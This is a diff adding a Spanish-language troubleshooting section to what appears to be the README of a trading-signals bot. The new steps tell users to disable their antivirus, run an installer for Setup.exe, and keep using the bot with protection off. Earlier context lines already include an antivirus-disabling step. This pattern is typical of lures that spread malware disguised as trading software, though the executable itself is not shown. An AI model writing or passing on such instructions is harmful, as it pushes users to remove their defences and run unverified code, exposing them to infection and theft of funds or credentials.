@@ -56,6 +56,21 @@ y esperá las señales de trading (tardan entre 10min - 15min en dar la primer s
 10. ✅ (Opcional) Reactivá tu antivirus.
 
 
+
+----------------------------------------
+🛡️ SEGUIS SIN PODER ABRIR EL BOT?
+----------------------------------------
+
+1. ❌ Desactiva Anti virus.
+
+2. 📦 Ejecuta Installer e installa el Setup.exe
+
+3. 🤖 Usa el bot sin activar el Anti virus.
+
+4. ✅ (Opcional) Cuando dejes de usar el bot vuelve a activar el Anti virus.
+
+
+
 ==============================
 ⚠️ IMPORTANTE
 ==============================
